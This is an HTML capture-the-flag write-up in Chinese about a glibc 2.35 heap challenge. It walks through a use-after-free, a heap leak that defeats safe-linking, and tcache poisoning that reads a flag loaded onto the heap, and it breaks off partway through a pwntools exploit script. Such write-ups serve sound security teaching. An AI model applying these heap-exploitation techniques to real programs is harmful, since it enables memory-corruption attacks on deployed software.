@@ -1,0 +1,558 @@
+<title>House of Water</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700;800&family=Source+Sans+3:ital,wght@0,400;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+  /* ============================================================
+     Layout: single reading column (~72ch) with a sticky spec rail on
+     wide screens; numbered sections because the exploit IS a sequence.
+     Color: cool-grey paper, ultramarine structure, brick "tainted" signal.
+     Type : Archivo (display) / Source Sans 3 (body) / JetBrains Mono (data)
+     ============================================================ */
+  :root{
+    color-scheme: light;
+    --bg:#f4f6f9;
+    --surface:#ffffff;
+    --surface-2:#eceff4;
+    --ink:#14161c;
+    --muted:#5d6672;
+    --faint:#8a929e;
+    --line:#dce1e8;
+    --line-strong:#c3cad4;
+    --accent:#2c37a0;
+    --accent-soft:#e7e9fb;
+    --signal:#b02e17;
+    --signal-soft:#fbeae6;
+    --good:#1f6b4d;
+    --code-bg:#0f1218;
+    --code-ink:#dfe4ec;
+    --code-muted:#7f8899;
+    --code-key:#9db0ff;
+    --code-str:#8fd0a8;
+    --code-com:#6b7385;
+    --shadow:0 1px 2px rgba(20,22,28,.06), 0 8px 24px -16px rgba(20,22,28,.35);
+    --radius:10px;
+    --col:72ch;
+  }
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      color-scheme: dark;
+      --bg:#0d0f14;
+      --surface:#151922;
+      --surface-2:#1c212c;
+      --ink:#e7eaf1;
+      --muted:#9aa3b2;
+      --faint:#6f7889;
+      --line:#262c38;
+      --line-strong:#38404f;
+      --accent:#96a2ff;
+      --accent-soft:#1e2440;
+      --signal:#ff8367;
+      --signal-soft:#301713;
+      --good:#5fd3a4;
+      --code-bg:#0a0c11;
+      --code-ink:#dfe4ec;
+      --code-muted:#7f8899;
+      --code-key:#a9b8ff;
+      --code-str:#93d6ac;
+      --code-com:#6b7385;
+      --shadow:0 1px 2px rgba(0,0,0,.5), 0 10px 30px -18px rgba(0,0,0,.9);
+    }
+  }
+  :root[data-theme="dark"]{
+    color-scheme: dark;
+    --bg:#0d0f14;
+    --surface:#151922;
+    --surface-2:#1c212c;
+    --ink:#e7eaf1;
+    --muted:#9aa3b2;
+    --faint:#6f7889;
+    --line:#262c38;
+    --line-strong:#38404f;
+    --accent:#96a2ff;
+    --accent-soft:#1e2440;
+    --signal:#ff8367;
+    --signal-soft:#301713;
+    --good:#5fd3a4;
+    --code-bg:#0a0c11;
+    --code-ink:#dfe4ec;
+    --code-muted:#7f8899;
+    --code-key:#a9b8ff;
+    --code-str:#93d6ac;
+    --code-com:#6b7385;
+    --shadow:0 1px 2px rgba(0,0,0,.5), 0 10px 30px -18px rgba(0,0,0,.9);
+  }
+
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:"Source Sans 3",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+    font-size:17px;
+    line-height:1.65;
+    padding-block:0 4rem;
+    padding-inline:20px;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:var(--accent);text-underline-offset:2px}
+  a:focus-visible,button:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:3px}
+
+  .wrap{max-width:1120px;margin:0 auto;display:grid;grid-template-columns:minmax(0,1fr);gap:2.5rem}
+  @media (min-width:1000px){
+    .wrap{grid-template-columns:minmax(0,var(--col)) 250px;align-items:start}
+  }
+
+  /* ---------- header ---------- */
+  header.masthead{grid-column:1/-1;padding-top:3.2rem}
+  .eyebrow{
+    font-family:"JetBrains Mono",ui-monospace,monospace;
+    font-size:.72rem;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--muted);margin:0 0 1rem;font-weight:500;
+  }
+  h1{
+    font-family:"Archivo",sans-serif;font-weight:800;
+    font-size:clamp(2.4rem,7vw,4rem);line-height:1.02;letter-spacing:-.02em;
+    margin:0 0 .6rem;text-wrap:balance;
+  }
+  h1 .dot{color:var(--signal)}
+  .thesis{font-size:1.15rem;color:var(--muted);max-width:60ch;margin:0 0 1.6rem;text-wrap:pretty}
+  .thesis b{color:var(--ink);font-weight:600}
+
+  .specs{display:flex;flex-wrap:wrap;gap:.5rem}
+  .chip{
+    display:inline-flex;align-items:center;gap:.45rem;
+    font-family:"JetBrains Mono",monospace;font-size:.76rem;
+    padding:.32rem .6rem;border:1px solid var(--line);border-radius:100px;
+    background:var(--surface);color:var(--muted);
+  }
+  .chip::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--line-strong)}
+  .chip.on::before{background:var(--signal)}
+  .chip.ok::before{background:var(--good)}
+  .chip b{color:var(--ink);font-weight:500}
+
+  /* ---------- article ---------- */
+  article{min-width:0}
+  section{margin:0 0 3.2rem;scroll-margin-top:1.5rem}
+  .sec-head{display:flex;align-items:baseline;gap:.8rem;margin-bottom:.4rem}
+  .sec-num{
+    font-family:"JetBrains Mono",monospace;font-size:.8rem;font-weight:700;
+    color:var(--accent);letter-spacing:.05em;
+  }
+  h2{
+    font-family:"Archivo",sans-serif;font-weight:700;font-size:1.55rem;
+    letter-spacing:-.01em;margin:.2rem 0 1rem;line-height:1.15;text-wrap:balance;
+  }
+  h3{font-family:"Archivo",sans-serif;font-weight:600;font-size:1.1rem;margin:1.8rem 0 .5rem}
+  p{margin:0 0 1rem;text-wrap:pretty}
+  ul,ol{margin:0 0 1rem;padding-left:1.3rem}
+  li{margin:.3rem 0}
+  strong{font-weight:600}
+  code:not(pre code){
+    font-family:"JetBrains Mono",monospace;font-size:.86em;
+    background:var(--surface-2);border:1px solid var(--line);
+    padding:.08em .38em;border-radius:5px;
+  }
+
+  /* code block */
+  .code{
+    background:var(--code-bg);border-radius:var(--radius);
+    border:1px solid var(--line);
+    margin:1.2rem 0;overflow:hidden;box-shadow:var(--shadow);
+  }
+  .code-top{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:.5rem .9rem;border-bottom:1px solid rgba(255,255,255,.07);
+    font-family:"JetBrains Mono",monospace;font-size:.72rem;color:var(--code-muted);
+    letter-spacing:.04em;
+  }
+  .code-top .dots{display:flex;gap:.35rem}
+  .code-top .dots i{width:9px;height:9px;border-radius:50%;background:#2b3444}
+  .code pre{
+    margin:0;padding:1rem 1.1rem;overflow-x:auto;
+    font-family:"JetBrains Mono",monospace;font-size:.82rem;line-height:1.6;
+    color:var(--code-ink);tab-size:4;
+  }
+  .k{color:var(--code-key)}
+  .s{color:var(--code-str)}
+  .c{color:var(--code-com);font-style:italic}
+  .hl{background:rgba(176,46,23,.28);border-radius:3px;padding:0 2px}
+
+  /* callouts */
+  .note{
+    border:1px solid var(--line);border-left:3px solid var(--accent);
+    background:var(--surface);border-radius:8px;padding:.85rem 1.05rem;
+    margin:1.3rem 0;box-shadow:var(--shadow);
+  }
+  .note .lbl{
+    font-family:"JetBrains Mono",monospace;font-size:.7rem;font-weight:700;
+    letter-spacing:.12em;text-transform:uppercase;color:var(--accent);
+    display:block;margin-bottom:.35rem;
+  }
+  .note.warn{border-left-color:var(--signal)}
+  .note.warn .lbl{color:var(--signal)}
+  .note p:last-child{margin-bottom:0}
+  .note code:not(pre code){background:var(--surface-2)}
+
+  /* figure */
+  figure{margin:1.6rem 0;border:1px solid var(--line);background:var(--surface);
+    border-radius:var(--radius);padding:1.1rem 1.1rem .5rem;box-shadow:var(--shadow)}
+  figure svg{display:block;width:100%;height:auto;color:var(--ink)}
+  figcaption{font-size:.83rem;color:var(--muted);padding:.6rem .2rem .4rem;line-height:1.5}
+
+  table{width:100%;border-collapse:collapse;font-size:.9rem;margin:1rem 0}
+  .tblwrap{overflow-x:auto}
+  th,td{text-align:left;padding:.5rem .7rem;border-bottom:1px solid var(--line)}
+  th{font-family:"JetBrains Mono",monospace;font-size:.72rem;letter-spacing:.06em;
+    text-transform:uppercase;color:var(--muted);font-weight:500}
+  td.mono,.mono{font-family:"JetBrains Mono",monospace;font-size:.82rem;font-variant-numeric:tabular-nums}
+  td.sig{color:var(--signal)}
+
+  /* sidebar rail */
+  .rail{display:none}
+  @media (min-width:1000px){
+    .rail{display:block;position:sticky;top:env(safe-area-inset-top,0px);padding-top:.4rem}
+  }
+  .rail .lbl{font-family:"JetBrains Mono",monospace;font-size:.68rem;letter-spacing:.14em;
+    text-transform:uppercase;color:var(--faint);margin:0 0 .7rem}
+  .rail ol{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:.1rem}
+  .rail a{
+    display:flex;gap:.55rem;font-size:.84rem;color:var(--muted);text-decoration:none;
+    padding:.25rem .4rem;border-radius:6px;border-left:2px solid transparent;
+  }
+  .rail a:hover{color:var(--ink);background:var(--surface-2)}
+  .rail a .n{font-family:"JetBrains Mono",monospace;font-size:.72rem;color:var(--faint)}
+  .rail .foot{margin-top:1.4rem;padding-top:1rem;border-top:1px solid var(--line);
+    font-size:.78rem;color:var(--faint)}
+
+  footer{grid-column:1/-1;border-top:1px solid var(--line);margin-top:1rem;padding-top:1.4rem;
+    color:var(--faint);font-size:.85rem}
+</style>
+
+<div class="wrap">
+  <header class="masthead">
+    <p class="eyebrow">pwn · glibc heap · ctf7</p>
+    <h1>House of Water<span class="dot">.</span></h1>
+    <p class="thesis">這題名字指向 2.34+ 的 FSOP 技巧,但真正的破口簡單得多:程式把 <b>flag 提早讀進了 heap</b>,而 free 之後沒有清空指標,留下一個 <b>use-after-free</b>。用 tcache poisoning 做一次任意讀,就結束了。</p>
+    <div class="specs">
+      <span class="chip on"><b>PIE</b></span>
+      <span class="chip on"><b>Full RELRO</b></span>
+      <span class="chip on"><b>NX</b></span>
+      <span class="chip on"><b>Canary</b></span>
+      <span class="chip ok">libc <b>2.35</b></span>
+      <span class="chip">glibc heap</span>
+    </div>
+  </header>
+
+  <article>
+    <section id="tldr">
+      <div class="sec-head"><span class="sec-num">TL;DR</span></div>
+      <h2>一句話版本</h2>
+      <p><code>free</code> 不清指標 + <code>edit</code>/<code>show</code> 不擋已釋放的 chunk ⇒ UAF。洩漏 heap(safe-linking 的 <code>next</code>),把 tcache 的 <code>next</code> 毒化成 <code>heap+0x290</code>,兩次 <code>malloc</code> 後回傳的指標 user data 正好落在 flag 上,直接 <code>show</code> 出來。</p>
+    </section>
+
+    <section id="s0">
+      <div class="sec-head"><span class="sec-num">§0</span></div>
+      <h2>先修環境:附的 loader 是錯的</h2>
+      <p>題目附了三個檔案,但 <code>ld</code> 與 <code>libc</code> 版本對不上:</p>
+      <div class="tblwrap">
+        <table>
+          <thead><tr><th>檔案</th><th>版本</th><th></th></tr></thead>
+          <tbody>
+            <tr><td class="mono">libc.so.6</td><td class="mono">Ubuntu GLIBC 2.35-0ubuntu3.15</td><td>正確</td></tr>
+            <tr><td class="mono">ld-linux-x86-64.so.2</td><td class="mono sig">Ubuntu GLIBC 2.39-0ubuntu8.8</td><td class="sig">錯誤</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>用附的 loader 跑,連選單都到不了,直接:</p>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>shell</span></div>
+<pre>$ ./ld-linux-x86-64.so.2 --library-path . ./chal
+*** stack smashing detected ***: terminated</pre></div>
+      <p>原因:loader 要負責設定 TLS 與 canary(<code>fs:0x28</code>)的初始值。2.39 的 loader 與 2.35 的 libc 對 TLS 佈局的認知不同,<code>__stack_chk_fail</code> 就從第一行開始亂叫。換一個 2.35 的 loader 即可:</p>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>shell</span></div>
+<pre>patchelf --set-interpreter /path/to/glibc-2.35/ld-linux-x86-64.so.2 \
+         --set-rpath '$ORIGIN' ./chal_patched</pre></div>
+      <div class="note warn"><span class="lbl">坑</span><p>如果沒有對應的 loader,可以找同一條 2.35 支線(例如 <code>2.35-0ubuntu3.14</code>)的 loader 頂著用,通常能跑;但別拿 2.39 / 2.42 的 loader 硬上。</p></div>
+    </section>
+
+    <section id="s1">
+      <div class="sec-head"><span class="sec-num">§1</span></div>
+      <h2>偵查</h2>
+      <p>先把保護和 libc 看清楚,因為這決定了整條路線。這個 glibc 版本有兩個關鍵變化,直接判了「傳統 hook」的死刑:</p>
+      <ul>
+        <li><strong>2.34 起移除 <code>__free_hook</code> / <code>__malloc_hook</code></strong>。想蓋函式指標拿 rip 的老路不通了——這正是題名 <em>house of water</em> 的由來,那個技巧是繞過 hook、改用 <code>_IO_wfile_jumps</code> 這類 wide-data FSOP。</li>
+        <li><strong>2.32 起 tcache 的 <code>next</code> 有 safe-linking</strong>:存進去的是 <code>ptr ^ (位址 &gt;&gt; 12)</code>。</li>
+        <li><strong>2.34 起 tcache 的 <code>key</code> 欄位被隨機化</strong>:不再是 tcache 指標,而是一個亂數 <code>tcache_key</code>(防 double-free)。這會讓「讀 <code>key</code> 拿 heap 指標」的老招失效。</li>
+      </ul>
+      <div class="note"><span class="lbl">重點</span><p>這題<strong>不需要 rip</strong>。等看到 §4 的 heap 佈局就知道,flag 早就在記憶體裡了,我們只要一個「任意讀」。</p></div>
+    </section>
+
+    <section id="s2">
+      <div class="sec-head"><span class="sec-num">§2</span></div>
+      <h2>程式邏輯</h2>
+      <p>一個標準的 heap 菜單,索引 <code>0..0x3f</code>,三張全域表:<code>chunks[]</code>(指標)、<code>sizes[]</code>(大小)、<code>freed[]</code>(每格一個 byte 的旗標)。</p>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>pseudo</span></div>
+<pre>1) malloc  Index: Size:    chunks[i]=malloc(size); sizes[i]=size; freed[i]=0
+2) free    Index:          free(chunks[i]); freed[i]=1        <span class="c">// 沒檢查、沒清空</span>
+3) edit    Index: Offset: Length: Data     fread(chunks[i]+off, 1, len, stdin)
+4) show    Index: Offset: Length:          逐 byte 印 hex
+5) exit</pre></div>
+      <p>所有 offset 都經過 <code>check_bounds</code>:</p>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>check_bounds.c</span></div>
+<pre><span class="k">if</span> (len &lt;= 0 || len &gt; 0x400) die();
+<span class="k">long</span> min = freed[idx] ? <span class="hl">-16</span> : 0;        <span class="c">// 已 free 的 chunk:offset 可以到 -16</span>
+<span class="k">if</span> (off &lt; min) die();
+<span class="k">if</span> (off + len &gt; sizes[idx]) die();      <span class="c">// 上界 = 當初請求的 size</span></pre></div>
+      <p>看起來有做檢查,但 <code>freed</code> 這個旗標不是「禁止存取」,只是「放寬下界到 -16」。真正缺的檢查在 <code>do_free</code>。</p>
+    </section>
+
+    <section id="s3">
+      <div class="sec-head"><span class="sec-num">§3</span></div>
+      <h2>漏洞:Use-After-Free</h2>
+      <p><code>do_free</code> 只做了 <code>free(chunks[idx])</code> 和 <code>freed[idx]=1</code>。<strong>指標沒有清成 NULL</strong>,而且 <code>edit</code> / <code>show</code> 都沒有阻擋「已釋放的 chunk」。所以 free 之後那格索引依然可以讀、可以寫——這不是 overflow,是 UAF。</p>
+
+      <figure>
+        <svg viewBox="0 0 680 150" role="img" aria-label="free 之後 chunks[i] 仍指向已釋放的 chunk,freed[i] 只是旗標,edit 與 show 依然可用">
+          <text x="20" y="26" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor" opacity=".55">chunks[ ]</text>
+          <text x="270" y="26" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor" opacity=".55">heap</text>
+          <!-- chunks array cell -->
+          <rect x="20" y="40" width="180" height="40" rx="7" fill="none" stroke="currentColor" stroke-width="1.4"/>
+          <text x="34" y="65" font-family="JetBrains Mono, monospace" font-size="13" fill="currentColor">chunks[i] = 0x…510</text>
+          <!-- arrow -->
+          <line x1="200" y1="60" x2="268" y2="60" stroke="currentColor" stroke-width="1.4"/>
+          <polygon points="268,60 258,55 258,65" fill="currentColor"/>
+          <text x="205" y="52" font-family="JetBrains Mono, monospace" font-size="10" fill="currentColor" opacity=".6">still points</text>
+          <!-- freed chunk -->
+          <rect x="270" y="40" width="170" height="40" rx="7" fill="none" stroke="#b02e17" stroke-width="1.6" stroke-dasharray="5 4"/>
+          <text x="284" y="65" font-family="JetBrains Mono, monospace" font-size="13" fill="#b02e17">freed chunk</text>
+          <text x="452" y="60" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".6">next / key</text>
+          <text x="452" y="76" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".6">已被 allocator 覆寫</text>
+          <!-- flag row -->
+          <rect x="20" y="104" width="180" height="30" rx="7" fill="none" stroke="currentColor" stroke-width="1.2" opacity=".6"/>
+          <text x="34" y="124" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor" opacity=".8">freed[i] = 1</text>
+          <text x="270" y="124" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor" opacity=".8">→ edit / show 照常運作 = UAF read / write</text>
+        </svg>
+        <figcaption>free 只把指標留在原地、另外設一個旗標。旗標唯一的作用是把可寫的 offset 下界從 0 放寬到 -16(chunk header 的 <code>size</code> 就在 -8),卻沒有阻止存取本體。</figcaption>
+      </figure>
+
+      <p>附帶一提,<code>do_free</code> 也沒擋重複 free,所以 double-free 也成立。不過這題用不到——單次 free 就夠了。</p>
+    </section>
+
+    <section id="s4">
+      <div class="sec-head"><span class="sec-num">§4</span></div>
+      <h2>關鍵佈局:flag 就在 heap 上</h2>
+      <p><code>setup()</code> 在<strong>任何選單操作之前</strong>就先把 flag 讀進了 heap:</p>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>setup.c</span></div>
+<pre>p = malloc(0x80);
+memset(p, 0, 0x80);
+fp = fopen(<span class="s">"./flag.txt"</span>, <span class="s">"r"</span>);
+fgets(p, 0x80, fp);      <span class="c">// ★ flag 直接落在 heap 上</span>
+fclose(fp);</pre></div>
+      <p>用 gdb 看 heap 開頭,佈局固定:</p>
+
+      <figure>
+        <svg viewBox="0 0 680 190" role="img" aria-label="heap 佈局:0x00 是 tcache_perthread_struct,0x2a0 是 setup 讀入的 flag 緩衝區,第一個使用者 malloc 落在 0x510">
+          <!-- offset labels above -->
+          <text x="24" y="30" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".55">+0x000</text>
+          <text x="286" y="30" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".55">+0x290</text>
+          <text x="344" y="30" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".55">+0x320</text>
+          <text x="540" y="30" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".55">+0x510</text>
+          <!-- strip -->
+          <rect x="24" y="40" width="262" height="56" rx="6" fill="none" stroke="currentColor" stroke-width="1.4"/>
+          <text x="40" y="64" font-family="Archivo, sans-serif" font-size="13" font-weight="600" fill="currentColor">tcache_perthread_struct</text>
+          <text x="40" y="82" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".6">chunk size 0x291</text>
+
+          <rect x="286" y="40" width="58" height="56" rx="6" fill="#b02e17" fill-opacity=".1" stroke="#b02e17" stroke-width="1.6"/>
+          <text x="293" y="82" font-family="JetBrains Mono, monospace" font-size="10" fill="#b02e17">flag</text>
+
+          <rect x="344" y="40" width="198" height="56" rx="6" fill="none" stroke="currentColor" stroke-width="1.2" stroke-dasharray="4 4" opacity=".7"/>
+          <text x="360" y="64" font-family="Archivo, sans-serif" font-size="12" font-weight="600" fill="currentColor" opacity=".8">fopen/fgets/fclose 內部</text>
+          <text x="360" y="82" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".55">大小取決於 libc,先別記</text>
+
+          <rect x="540" y="40" width="110" height="56" rx="6" fill="none" stroke="#2c37a0" stroke-width="1.6"/>
+          <text x="554" y="64" font-family="Archivo, sans-serif" font-size="12" font-weight="600" fill="#2c37a0">A</text>
+          <text x="554" y="82" font-family="JetBrains Mono, monospace" font-size="10" fill="#2c37a0">第一個 user malloc</text>
+
+          <!-- ruler -->
+          <line x1="24" y1="118" x2="652" y2="118" stroke="currentColor" stroke-width="1" opacity=".4"/>
+          <g stroke="currentColor" stroke-width="1" opacity=".4">
+            <line x1="24" y1="118" x2="24" y2="126"/>
+            <line x1="286" y1="118" x2="286" y2="126"/>
+            <line x1="344" y1="118" x2="344" y2="126"/>
+            <line x1="540" y1="118" x2="540" y2="126"/>
+            <line x1="650" y1="118" x2="650" y2="126"/>
+          </g>
+          <text x="24" y="142" font-family="JetBrains Mono, monospace" font-size="10" fill="currentColor" opacity=".5">0x000</text>
+          <text x="272" y="142" font-family="JetBrains Mono, monospace" font-size="10" fill="currentColor" opacity=".5">0x290</text>
+          <text x="330" y="142" font-family="JetBrains Mono, monospace" font-size="10" fill="currentColor" opacity=".5">0x320</text>
+          <text x="524" y="142" font-family="JetBrains Mono, monospace" font-size="10" fill="currentColor" opacity=".5">0x510</text>
+          <text x="632" y="142" font-family="JetBrains Mono, monospace" font-size="10" fill="currentColor" opacity=".5">0x620</text>
+
+          <!-- the flag content -->
+          <text x="24" y="172" font-family="JetBrains Mono, monospace" font-size="12" fill="#b02e17">heap+0x2a0 : "flag{…}"   ← setup 讀進來的那一行</text>
+        </svg>
+        <figcaption>heap+0x00 是 tcache 結構(<code>setup</code> 的第一次 malloc 觸發),緊接著 0x2a0 就是 flag 緩衝區,大小固定 0x80。第一個使用者 malloc 落在 0x510。</figcaption>
+      </figure>
+
+      <div class="note"><span class="lbl">策略</span><p>目標位址 <code>heap+0x2a0</code> 是死的。我們只要讓某次 <code>malloc</code> 回傳一個「user data 落在 flag 上」的假 chunk,然後 <code>show</code> 它即可。而 heap 位址可以完整洩漏出來。</p></div>
+    </section>
+
+    <section id="s5">
+      <div class="sec-head"><span class="sec-num">§5</span></div>
+      <h2>洩漏 heap</h2>
+      <p>tcache 的 <code>key</code> 欄位在 2.34 之後被換成亂數,不能再用。改用 <code>next</code>。safe-linking 的規則是:寫入的值 = <code>ptr ^ (欄位位址 &gt;&gt; 12)</code>。剛好 free 進「空的 bin」時,前一個節點是 NULL:</p>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>python</span></div>
+<pre>free(A)   <span class="c"># bin 空 → A.next = 0 ^ (A&gt;&gt;12) = A&gt;&gt;12</span>
+free(B)   <span class="c"># B.next = (B&gt;&gt;12) ^ A</span>
+
+fdA = u64(show(0, 0, 8))   <span class="c"># = A&gt;&gt;12</span>
+fdB = u64(show(1, 0, 8))   <span class="c"># = (B&gt;&gt;12) ^ A</span>
+A_full = fdB ^ fdA         <span class="c"># A、B 同一個 4K page ⇒ B&gt;&gt;12 == A&gt;&gt;12</span>
+heap   = fdA &lt;&lt; 12         <span class="c"># heap 是 page 對齊,而 A 就落在那頁</span></pre></div>
+      <p>兩個小 chunk 相鄰配置,一定同一個 4KB 頁,所以 <code>B&gt;&gt;12 == A&gt;&gt;12</code>,把 <code>fdA</code> 當成遮罩就能還原出 A 的完整位址;而 heap base 是頁對齊的,<code>fdA &lt;&lt; 12</code> 就是它。</p>
+    </section>
+
+    <section id="s6">
+      <div class="sec-head"><span class="sec-num">§6</span></div>
+      <h2>Tcache poisoning</h2>
+      <p>UAF write 可以直接改「已釋放 chunk」的 <code>next</code>(offset 0 在 <code>freed</code> 時是允許的),於是我們能讓某個 tcache bin 的下一個節點指向任意位址。</p>
+      <p>這裡有個細節:<code>tcache_get</code> 每 pop 一次就會 <code>counts--</code>。要「先讓 <code>entries</code> 變成我們控制的位址、再 pop 一次把那個位址拿出來」,過程中 <code>counts</code> 必須 ≥ 1——所以 bin 裡要放 <strong>兩個</strong> entry。</p>
+
+      <figure>
+        <svg viewBox="0 0 680 230" role="img" aria-label="tcache poisoning:先把 B 與 A 放進同一個 bin,再改寫 B.next 指向假 chunk T=heap+0x290,兩次 malloc 後第二次回傳 T">
+          <!-- row: before -->
+          <text x="20" y="26" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".55">free(0); free(1) 之後</text>
+          <rect x="20" y="34" width="120" height="30" rx="6" fill="none" stroke="currentColor" stroke-width="1.3"/>
+          <text x="34" y="54" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor">entries[5]</text>
+          <line x1="140" y1="49" x2="182" y2="49" stroke="currentColor" stroke-width="1.3"/><polygon points="182,49 172,44 172,54" fill="currentColor"/>
+          <rect x="184" y="34" width="90" height="30" rx="6" fill="none" stroke="currentColor" stroke-width="1.3"/>
+          <text x="206" y="54" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor">B</text>
+          <line x1="274" y1="49" x2="316" y2="49" stroke="currentColor" stroke-width="1.3"/><polygon points="316,49 306,44 306,54" fill="currentColor"/>
+          <rect x="318" y="34" width="90" height="30" rx="6" fill="none" stroke="currentColor" stroke-width="1.3"/>
+          <text x="340" y="54" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor">A</text>
+          <line x1="408" y1="49" x2="446" y2="49" stroke="currentColor" stroke-width="1.3"/><polygon points="446,49 436,44 436,54" fill="currentColor"/>
+          <text x="452" y="54" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor" opacity=".5">∅</text>
+          <text x="470" y="54" font-family="JetBrains Mono, monospace" font-size="10" fill="currentColor" opacity=".5">counts = 2</text>
+
+          <!-- row: after edit -->
+          <text x="20" y="104" font-family="JetBrains Mono, monospace" font-size="11" fill="#b02e17">edit(1, 0, mangle(heap+0x290))</text>
+          <rect x="20" y="112" width="120" height="30" rx="6" fill="none" stroke="currentColor" stroke-width="1.3"/>
+          <text x="34" y="132" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor">entries[5]</text>
+          <line x1="140" y1="127" x2="182" y2="127" stroke="currentColor" stroke-width="1.3"/><polygon points="182,127 172,122 172,132" fill="currentColor"/>
+          <rect x="184" y="112" width="90" height="30" rx="6" fill="none" stroke="currentColor" stroke-width="1.3"/>
+          <text x="206" y="132" font-family="JetBrains Mono, monospace" font-size="12" fill="currentColor">B</text>
+          <line x1="274" y1="127" x2="316" y2="127" stroke="#b02e17" stroke-width="1.6"/><polygon points="316,127 306,122 306,132" fill="#b02e17"/>
+          <rect x="318" y="112" width="150" height="30" rx="6" fill="#b02e17" fill-opacity=".1" stroke="#b02e17" stroke-width="1.6"/>
+          <text x="330" y="132" font-family="JetBrains Mono, monospace" font-size="12" fill="#b02e17">T = heap+0x290</text>
+
+          <!-- row: pops -->
+          <text x="20" y="182" font-family="JetBrains Mono, monospace" font-size="11" fill="currentColor" opacity=".55">兩次 malloc</text>
+          <rect x="20" y="190" width="210" height="30" rx="6" fill="none" stroke="#2c37a0" stroke-width="1.4"/>
+          <text x="34" y="210" font-family="JetBrains Mono, monospace" font-size="12" fill="#2c37a0">malloc #1 → 回傳 B</text>
+          <rect x="248" y="190" width="300" height="30" rx="6" fill="none" stroke="#2c37a0" stroke-width="1.6"/>
+          <text x="262" y="210" font-family="JetBrains Mono, monospace" font-size="12" fill="#2c37a0">malloc #2 → 回傳 heap+0x290</text>
+          <text x="560" y="210" font-family="JetBrains Mono, monospace" font-size="11" fill="#b02e17">= flag−0x10</text>
+        </svg>
+        <figcaption>把 head(B) 的 <code>next</code> 改寫成 <code>T</code>,第一次 pop 取出 B 並把 <code>entries</code> 變成 T,第二次 pop 就回傳 T。兩次都在同一個 size class。</figcaption>
+      </figure>
+
+      <p>為什麼挑 <code>T = heap+0x290</code>?因為 <code>tcache_get</code> 取出節點時會寫 <code>e-&gt;key = 0</code> 到 <code>T+8</code>:</p>
+      <ul>
+        <li><code>T+8 = heap+0x298</code> 是 flag chunk 的 <code>size</code> 欄位,被寫成 0 無所謂(我們只讀不 free)。</li>
+        <li>user data <code>T+0x10 = heap+0x2a0</code> 正是 flag——<strong>沒有被動到</strong>。</li>
+      </ul>
+      <div class="note warn"><span class="lbl">坑</span><p>2.35 多了 <code>malloc(): unaligned tcache chunk detected</code>,被毒化的位址必須 16-byte 對齊。<code>heap+0x290</code> 符合(0x290 &amp; 0xf = 0)。</p></div>
+    </section>
+
+    <section id="s7">
+      <div class="sec-head"><span class="sec-num">§7</span></div>
+      <h2>完整 exploit</h2>
+      <p>size 選 <code>0x100</code> 是為了讓之後 <code>show</code> 的長度上限夠大,能一次讀完整個 0x80 的 flag 緩衝區。</p>
+      <div class="code"><div class="code-top"><span class="dots"><i></i><i></i><i></i></span><span>exp.py</span></div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+<span class="k">import</span> re
+context.arch = <span class="s">'amd64'</span>
+io = process(<span class="s">'./chal_patched'</span>)   <span class="c"># 已 patchelf 指向 2.35 的 loader</span>
+
+<span class="k">def</span> add(i, s):
+    io.sendlineafter(<span class="s">b'&gt; '</span>, <span class="s">b'1'</span>)
+    io.sendlineafter(<span class="s">b'Index: '</span>, str(i).encode())
+    io.sendlineafter(<span class="s">b'Size: '</span>,  str(s).encode())
+<span class="k">def</span> free(i):
+    io.sendlineafter(<span class="s">b'&gt; '</span>, <span class="s">b'2'</span>); io.sendlineafter(<span class="s">b'Index: '</span>, str(i).encode())
+<span class="k">def</span> edit(i, off, data):
+    io.sendlineafter(<span class="s">b'&gt; '</span>, <span class="s">b'3'</span>); io.sendlineafter(<span class="s">b'Index: '</span>, str(i).encode())
+    io.sendlineafter(<span class="s">b'Offset: '</span>, str(off).encode())
+    io.sendlineafter(<span class="s">b'Length: '</span>, str(len(data)).encode())
+    io.sendafter(<span class="s">b'bytes): '</span>, data)   <span class="c"># 關鍵:raw,不加換行</span>
+<span class="k">def</span> show(i, off, n):
